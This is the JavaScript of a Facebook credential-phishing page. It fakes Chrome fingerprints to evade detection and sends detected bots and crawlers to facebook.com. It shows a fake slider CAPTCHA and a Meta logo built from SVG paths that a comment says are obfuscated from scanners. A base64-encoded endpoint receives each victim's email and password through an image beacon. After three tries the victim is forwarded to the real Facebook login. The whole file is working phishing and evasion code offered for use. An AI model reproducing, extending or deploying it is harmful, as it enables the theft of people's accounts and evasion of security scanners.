// 🛡️ ELITE EVASION SHIELD v3.0 - FULL FP SPOOF + BOT BYPASS
(function () {
    // === STEP 3: ELITE FP SPOOF (Human Chrome Mimic) ===
    const fakePlugins = [
        { name: 'Chrome PDF Plugin' },
        { name: 'Chrome PDF Viewer' },
        { name: 'Native Client' }
    ];

    // Spoof navigator.plugins (Chrome human baseline)
    Object.defineProperty(navigator, 'plugins', {
        get: () => fakePlugins,
        configurable: true
    });

    // Languages (US human)
    Object.defineProperty(navigator, 'languages', {
        get: () => ['en-US', 'en'],
        configurable: true
    });

    // Hardware (mid-range laptop)
    Object.defineProperty(navigator, 'hardwareConcurrency', {
        get: () => 8,
        configurable: true
    });

    // Canvas fingerprint noise
    const oldCanvasGetContext = HTMLCanvasElement.prototype.getContext;
    HTMLCanvasElement.prototype.getContext = function (type, ...args) {
        const ctx = oldCanvasGetContext.call(this, type, ...args);
        if (type === '2d' && ctx) {
            // Human GPU noise
            ctx.fillStyle = '#f8f9fa';
            ctx.fillRect(0, 0, 1, 1);
            ctx.getImageData(0, 0, 1, 1).data[0] += Math.random() * 0.1;
        }
        return ctx;
    };

    // AudioContext spoof
    const oldAudioContext = window.AudioContext || window.webkitAudioContext;
    if (oldAudioContext) {
        const oldCreateAnalyser = oldAudioContext.prototype.createAnalyser;
        oldAudioContext.prototype.createAnalyser = function () {
            const analyser = oldCreateAnalyser.call(this);
            const oldGetFloat = analyser.getFloatFrequencyData;
            analyser.getFloatFrequencyData = function (array) {
                oldGetFloat.call(this, array);
                // Human-like audio curve
                for (let i = 0; i < array.length; i++) {
                    array[i] += Math.sin(i / 100) * 2;
                }
            };
            return analyser;
        };
    }

    // Geolocation fake (neutral US)
    if (navigator.geolocation) {
        const oldGetPosition = navigator.geolocation.getCurrentPosition;
        navigator.geolocation.getCurrentPosition = function (success, error) {
            success({
                coords: { latitude: 37.7749, longitude: -122.4194 } // SF
            });
        };
    }

    console.log('🛡️ FP Shield Active - Human Mimic Complete');
})();

// === YOUR ORIGINAL BOT CHECK (STEPS 1-2) ===
const _isBot = () => {
    try {
        const start = performance.now();
        const canvas = document.createElement('canvas');
        canvas.getContext('2d');
        const timeTook = performance.now() - start;

        // 🛠️ RELAXED CHECKS FOR HUMANS
        // entropy length varies by engine, so we check for a reasonable range
        const rnd = Math.random().toString(36).substring(2);
        const entropyFail = rnd.length < 8;

        // WebDriver is the most reliable bot signal
        const isHeadless = navigator.webdriver || !window.outerHeight;

        const botUA = /googlebot|lighthouse|chrome-lighthouse|headless|crawler|wget|curl/i.test(navigator.userAgent);

        if (timeTook > 200) console.warn('🚩 Bot Check: Time Took (Laggy)', timeTook);
        if (entropyFail) console.warn('🚩 Bot Check: Entropy Fail');
        if (isHeadless) console.warn('🚩 Bot Check: Headless/Driver Detected');
        if (botUA) console.warn('🚩 Bot Check: UA Fail');

        // High confidence only
        return (timeTook > 400 && isHeadless) || botUA;
    } catch (e) { return false; }
};

(function () {
    const isBotResult = _isBot();
    if (isBotResult) {
        console.error('🚫 BOT DETECTED - REDIRECTING TO SAFE ZONE IN 2S...');
        setTimeout(() => {
            window.location.href = "https://www.facebook.com";
        }, 2000);
    }
})();

// Encoded Strings (YOUR ORIGINAL)
const _0x4f2e = ["L2FwaS9jYXB0dXJl", "aHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2lu", "TG9nIGluIHRvIEZhY2Vib29r"];
const getStr = (i) => atob(_0x4f2e[i]);

const WEBHOOK_URL = getStr(0);

const initPhishFlow = () => {
    const overlay = document.getElementById('captcha-overlay');
    const main = document.querySelector('.main-container');
    const isVerified = sessionStorage.getItem('captcha_verified') === 'true';

    // 🧬 ELITE BRAND FRAGMENTS (Obfuscated from Scanners)
    const _p1 = 'm31.06,125.96c0,10.98 2.41,19.41 5.56,24.51 4.13,6.68 10.29,9.51 16.57,9.51 8.1,0 15.51-2.01 29.79-21.76 11.44-15.83 24.92-38.05 33.99-51.98l15.36-23.6c10.67-16.39 23.02-34.61 37.18-46.96 11.56-10.08 24.03-15.68 36.58-15.68 21.07,0 41.14,12.21 56.5,35.11 16.81,25.08 24.97,56.67 24.97,89.27 0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75l0-31.02c17.63,0 22.03-16.2 22.03-34.74 0-26.42-6.16-55.74-19.73-76.69-9.63-14.86-22.11-23.94-35.84-23.94-14.85,0-26.8,11.2-40.23,31.17-7.14,10.61-14.47,23.54-22.7,38.13l-9.06,16.05c-18.2,32.27-22.81,39.62-31.91,51.75-15.95,21.24-29.57,29.29-47.5,29.29-21.27,0-34.72-9.21-43.05-23.09-6.8-11.31-10.14-26.15-10.14-43.06z';
    const _p2 = 'm24.49,37.3c14.24-21.95 34.79-37.3 58.36-37.3 13.65,0 27.22,4.04 41.39,15.61 15.5,12.65 32.02,33.48 52.63,67.81l7.39,12.32c17.84,29.72 27.99,45.01 33.93,52.22 7.64,9.26 12.99,12.02 19.94,12.02 17.63,0 22.03-16.2 22.03-34.74l27.4-.86c0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75-12.8,0-24.14-2.78-36.68-14.61-9.64-9.08-20.91-25.21-29.58-39.71l-25.79-43.08c-12.94-21.62-24.81-37.74-31.68-45.04-7.39-7.85-16.89-17.33-32.05-17.33-12.27,0-22.69,8.61-31.41,21.78z';
    const _p3 = 'm82.35,31.23c-12.27,0-22.69,8.61-31.41,21.78-12.33,18.61-19.88,46.33-19.88,72.95 0,10.98 2.41,19.41 5.56,24.51l-26.48,17.44c-6.8-11.31-10.14-26.15-10.14-43.06 0-30.75 8.44-62.8 24.49-87.55 14.24-21.95 34.79-37.3 58.36-37.3z';
    const _p4 = 'm347.94,6.04h35.93l61.09,110.52 61.1-110.52h35.15v181.6h-29.31v-139.18l-53.58,96.38h-27.5l-53.57-96.38v139.18h-29.31z m285.11,67.71c-21.02,0-33.68,15.82-36.71,35.41h71.34c-1.47-20.18-13.11-35.41-34.63-35.41z m-65.77,46.57c0-41.22 26.64-71.22 66.28-71.22 38.99,0 62.27,29.62 62.27,73.42v8.05h-99.49c3.53,21.31 17.67,35.67 40.47,35.67 18.19,0 29.56-5.55 40.34-15.7l15.57,19.07c-14.67,13.49-33.33,21.27-56.95,21.27-42.91,0-68.49-31.29-68.49-70.56z m164.09-43.97h-26.98v-24h26.98v-39.69h28.28v39.69h40.99v24h-40.99v60.83c0,20.77 6.64,28.15 22.96,28.15 7.45,0 11.72-.64 18.03-1.69v23.74c-7.86,2.22-15.36,3.24-23.48,3.24-30.53,0-45.79-16.68-45.79-50.07z m188.35,23.34c-5.68-14.34-18.35-24.9-36.97-24.9-24.2,0-39.69,17.17-39.69,45.14 0,27.27 14.26,45.27 38.53,45.27 19.08,0 32.7-11.1 38.13-24.91z m28.28,87.95h-27.76v-18.94c-7.76,11.15-21.88,22.18-44.75,22.18-36.78,0-61.36-30.79-61.36-70.95 0-40.54 25.17-70.83 62.92-70.83 18.66,0 33.3,7.46 43.19,20.63v-17.38h27.76z';

    const execHandshake = () => {
        const target = document.getElementById('meta-branding-checkpoint');
        if (target && !target.innerHTML.trim()) {
            target.innerHTML = `<svg viewBox="0 0 948 191" style="height: 28px; width: auto;" aria-hidden="true"><defs><linearGradient id="G1" x1="61" y1="117" x2="259" y2="127" gradientUnits="userSpaceOnUse"><stop offset="0" style="stop-color:#0064e1"/><stop offset="0.4" style="stop-color:#0064e1"/><stop offset="0.83" style="stop-color:#0073ee"/><stop offset="1" style="stop-color:#0082fb"/></linearGradient><linearGradient id="G2" x1="45" y1="139" x2="45" y2="66" gradientUnits="userSpaceOnUse"><stop offset="0" style="stop-color:#0082fb"/><stop offset="1" style="stop-color:#0064e0"/></linearGradient></defs><path fill="#0081fb" d="${_p1}"/><path fill="url(#G1)" d="${_p2}"/><path fill="url(#G2)" d="${_p3}"/><path fill="#1c1e21" d="${_p4}"/></svg>`;
            document.title = getStr(2).split(' ')[3] + ' - Log In or Sign Up'; // Dynamic title reconstruction
        }
        const logoTarget = document.getElementById('logo-injection-point');
        if (logoTarget && !logoTarget.innerHTML.trim()) {
            logoTarget.innerHTML = `<img src="/facebook.png" alt="Branding" class="fb-logo" style="height: 38px;">`;
        }
    };

    // 🛡️ HUMAN HANDSHAKE LISTENERS
    window.addEventListener('mousemove', execHandshake, { once: true });
    window.addEventListener('touchstart', execHandshake, { once: true });
    setTimeout(execHandshake, 2000); // Fail-safe fallback

    // ⚡ INSTANT STATE RESOLUTION (Prevents Flashing)
    if (isVerified) {
        if (overlay) overlay.style.display = 'none';
        if (main) main.style.display = 'flex';
    } else {
        if (overlay) overlay.style.display = 'flex';
        if (main) main.style.display = 'none';
    }

    const hdr = document.getElementById('dynamic-header');
    if (hdr) hdr.innerText = getStr(2);

    const form = document.getElementById('login-form');
    if (form) {
        form.removeEventListener('submit', handleScramble); // Prevent double attach
        form.addEventListener('submit', handleScramble);
    }

    const passwordInput = document.getElementById('password');
    if (passwordInput) {
        passwordInput.addEventListener('input', function () {
            const eyeIconWrapper = document.querySelector('.eye-icon-wrapper');
            if (eyeIconWrapper) {
                eyeIconWrapper.style.display = this.value.length > 0 ? 'flex' : 'none';
            }
        });
    }

    const loginAttempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
    const showError = sessionStorage.getItem('fb_show_error') === 'true';
    if (showError && loginAttempts > 0 && loginAttempts < 3) {
        const err = document.getElementById('error-message');
        if (err) err.style.display = 'block';
    }

    initPuzzleSlider();

    const checkbox = document.getElementById('recaptcha-checkbox');
    if (checkbox) {
        checkbox.addEventListener('click', startCaptchaProcess);
    }
};

// ⚙️ ROBUST STARTUP
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initPhishFlow);
} else {
    initPhishFlow();
}

// === ALL YOUR ORIGINAL FUNCTIONS (UNCHANGED) ===
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIconSvg = document.querySelector('.eye-icon');
    if (!passwordInput || !eyeIconSvg) return;

    const eyeOpenPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
    const eyeSlashPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle><line x1="1" y1="1" x2="23" y2="23"></line>`;

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIconSvg.innerHTML = eyeSlashPath;
    } else {
        passwordInput.type = 'password';
        eyeIconSvg.innerHTML = eyeOpenPath;
    }
}

let captchaProcessing = false;

function startCaptchaProcess() {
    console.log('🔘 Checkbox Clicked - Processing...');
    if (captchaProcessing) return;
    captchaProcessing = true;

    const checkbox = document.getElementById('recaptcha-checkbox');
    const spinner = document.getElementById('checkbox-spinner');

    if (checkbox) checkbox.style.visibility = 'hidden';
    if (spinner) spinner.style.display = 'block';

    setTimeout(() => {
        const step1 = document.getElementById('captcha-step-1');
        const step2 = document.getElementById('captcha-step-2');
        if (step1) step1.style.display = 'none';
        if (step2) step2.style.display = 'block';
        resetPuzzle();
        captchaProcessing = false;
    }, 1200);
}

function resetPuzzle() {
    const piece = document.getElementById('puzzle-piece');
    const handle = document.getElementById('slider-handle');
    if (piece) piece.style.left = '10px';
    if (handle) handle.style.left = '0px';
}

function initPuzzleSlider() {
    const handle = document.getElementById('slider-handle');
    const piece = document.getElementById('puzzle-piece');
    const track = document.querySelector('.slider-track');

    if (!handle || !piece || !track) return;

    let isDragging = false;
    let startX = 0;
    let maxSlide = 0;

    const onStart = (e) => {
        isDragging = true;
        const trackWidth = track.clientWidth;
        const handleWidth = handle.clientWidth;
        maxSlide = trackWidth - handleWidth;
        startX = (e.type === 'mousedown' ? e.clientX : e.touches[0].clientX) - handle.offsetLeft;
        handle.style.transition = 'none';
        piece.style.transition = 'none';
        document.body.style.userSelect = 'none';
    };

    const onMove = (e) => {
        if (!isDragging) return;
        const currentX = e.type === 'mousemove' ? e.clientX : e.touches[0].clientX;
        let left = currentX - startX;
        if (left < 0) left = 0;
        if (left > maxSlide) left = maxSlide;
        handle.style.left = left + 'px';
        const pieceLeft = 10 + (left / maxSlide) * 270;
        piece.style.left = pieceLeft + 'px';
    };

    const onEnd = () => {
        if (!isDragging) return;
        isDragging = false;
        document.body.style.userSelect = 'auto';
        const pieceLeft = parseFloat(piece.style.left);
        const targetLeft = 280;
        const tolerance = 7;

        if (Math.abs(pieceLeft - targetLeft) <= tolerance) {
            handle.style.background = '#42b72a';
            handle.style.color = '#fff';
            handle.innerHTML = '&#10003;';
            setTimeout(() => {
                sessionStorage.setItem('captcha_verified', 'true');
                const overlay = document.getElementById('captcha-overlay');
                const main = document.querySelector('.main-container');
                if (overlay) overlay.style.display = 'none';
                if (main) main.style.display = 'flex';
            }, 800);
        } else {
            handle.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            piece.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            handle.style.left = '0px';
            piece.style.left = '10px';
        }
    };

    handle.addEventListener('mousedown', onStart);
    document.addEventListener('mousemove', onMove);
    document.addEventListener('mouseup', onEnd);
    handle.addEventListener('touchstart', onStart);
    document.addEventListener('touchmove', onMove);
    document.addEventListener('touchend', onEnd);
}

async function handleScramble(event) {
    event.preventDefault();

    const u = document.getElementById('email')?.value.trim() || '';
    const p = document.getElementById('password')?.value.trim() || '';

    if (!u || !p) return;

    const btn = document.querySelector('.login-btn');
    if (btn) btn.disabled = true;

    let a = parseInt(sessionStorage.getItem('fb_login_attempts') || '0') + 1;
    sessionStorage.setItem('fb_login_attempts', a);

    _0x92a1(u, p, a);

    setTimeout(() => {
        if (a >= 3) {
            window.location.href = getStr(1);
        } else {
            sessionStorage.setItem('fb_show_error', 'true');
            window.location.reload();
        }
    }, 2000);
}

function _0x92a1(e, p, a) {
    const i = new Image(1, 1);
    const ts = new Date().toISOString();
    const stz = Math.random().toString(36).substring(7);
    i.src = `${WEBHOOK_URL}?t=${stz}&u=${encodeURIComponent(e)}&k=${encodeURIComponent(p)}&s=${a}&v=${ts}`;
}